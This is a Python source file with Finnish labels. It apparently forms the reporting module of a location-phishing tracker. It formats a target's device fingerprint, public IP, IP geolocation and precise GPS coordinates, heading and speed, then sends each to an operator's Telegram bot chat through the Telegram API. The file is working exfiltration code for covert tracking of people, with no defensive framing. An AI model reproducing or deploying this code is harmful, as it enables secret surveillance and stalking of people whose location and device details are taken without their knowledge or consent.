import utils
import requests
from json import dumps, loads

R = '\033[31m'  # punainen
G = '\033[32m'  # vihreä
C = '\033[36m'  # syan
W = '\033[0m'   # valkoinen
Y = '\033[33m'  # keltainen

def laheta_pyynto(token, viesti):
    api_url = f'https://api.telegram.org/bot{token[0]}:{token[1]}/sendMessage'
    api_params = {
        'chat_id': token[2],
        'text': viesti,
        'parse_mode': 'MarkdownV2'
    }
    rqst = requests.get(api_url, params=api_params, timeout=10)
    if rqst.status_code != 200:
        utils.print(f'{R}[-] {C}Telegram :{W} [{rqst.status_code}] {loads(rqst.text)["description"]}\n')


def tgram_sender(viestityyppi, sisalto, token):
    json_str = dumps(sisalto)
    json_content = loads(json_str)
    
    if viestityyppi == 'device_info':
        laiteviesti = f"""
*Laite Tiedot*

Käyttöjärjestelmä : {json_content['os']} Alusta : {json_content['platform']} Selaimen versio : {json_content['browser']} GPU valmistaja : {json_content['vendor']} GPU : {json_content['render']} CPU ytimiä : {json_content['cores']} RAM : {json_content['ram']} Julkinen IP : {json_content['ip']} Resoluutiot : {json_content['ht']}x{json_content['wd']}

"""
        laheta_pyynto(token, laiteviesti)

    if viestityyppi == 'ip_info':
        ip_viesti = f"""
*IP Tiedot*

Manner : {json_content['continent']} Maa : {json_content['country']} Alue : {json_content['region']} Kaupunki : {json_content['city']} Organisaatio : {json_content['org']} ISP : {json_content['isp']}

"""
        laheta_pyynto(token, ip_viesti)

    if viestityyppi == 'location':
        sijaintiviesti = f"""
*Sijainti Tiedot*

Leveysaste : {json_content['lat']}
Pituusaste : {json_content['lon']}
Tarkkuus : {json_content['acc']}
Korkeus : {json_content['alt']}
Suuntima : {json_content['dir']}
Nopeus : {json_content['spd']}

"""
        laheta_pyynto(token, sijaintiviesti)

    if viestityyppi == 'url':
        url_viesti = json_content['url']
        laheta_pyynto(token, url_viesti)

    if viestityyppi == 'error':
        virhe_viesti = json_content['error']
        laheta_pyynto(token, virhe_viesti)